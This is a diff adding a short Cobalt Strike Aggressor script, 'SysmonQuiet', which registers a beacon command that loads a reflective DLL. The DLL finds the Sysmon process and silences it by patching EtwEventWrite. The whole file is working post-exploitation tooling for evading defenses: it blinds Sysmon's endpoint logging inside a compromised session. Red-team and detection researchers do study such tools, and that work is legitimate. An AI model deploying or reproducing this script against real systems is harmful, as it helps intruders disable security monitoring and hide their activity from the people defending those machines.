@@ -1,0 +1,21 @@
+# SysmonQuiet RDLL Aggressor Script by ScriptIdiot
+
+beacon_command_register(
+"SysmonQuiet",
+"Automtically locate sysmon process and silence sysmon process by EtwEventWrite patching (require SeDebugPrivilege privilege)",
+"
+Usage: SysmonQuiet
+
+Automtically locate sysmon process and silence sysmon process");
+
+alias SysmonQuiet{
+	$barch  = barch($1);
+
+    if($barch eq "x86")
+    {
+        berror($1, "SysmonQuiet does not support x86");
+        return;
+    }
+
+	bdllspawn($1, script_resource("SysmonQuiet.dll"), $2, "SysmonQuiet", 5000, false);
+}
